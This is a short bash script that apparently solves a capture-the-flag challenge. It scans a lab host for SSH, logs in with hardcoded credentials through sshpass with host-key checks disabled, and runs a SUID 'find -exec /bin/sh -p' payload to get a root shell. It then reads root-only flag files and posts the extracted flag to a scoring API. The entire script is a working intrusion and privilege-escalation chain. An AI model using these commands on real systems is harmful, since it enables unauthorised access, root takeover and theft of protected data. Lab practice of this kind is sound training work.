#!/bin/bash
set -euo pipefail

host='172.20.0.147'
user='deckhand'
password='orbital-wrench-61'

nmap -n -Pn -p 22 --open "$host" >/dev/null
ncat -z -w 3 "$host" 22

remote_cmd='find / -maxdepth 0 -exec /bin/sh -p -c "id; cat /root/flag; cat /root/.escalation-proof" \;'
output="$(sshpass -p "$password" ssh -o StrictHostKeyChecking=no -o UserKnownHostsFile=/dev/null -o ConnectTimeout=5 "$user@$host" "$remote_cmd")"
printf '%s\n' "$output"

flag="$(python3 -c 'import re,sys; m=re.search(r"BSY\{[^}\r\n]+\}", sys.argv[1]); print(m.group(0) if m else "")' "$output")"
if [[ -z "$flag" ]]; then
  echo 'Could not extract the flag from the root output.' >&2
  exit 1
fi

curl -s http://172.20.0.3/api/challenges/submit -X POST -H 'Content-Type: application/json' --data-binary "{\"challenge_id\":\"scl-challenge-frame-0cd6a3\",\"task_id\":\"task1\",\"flag\":\"$flag\"}"
echo
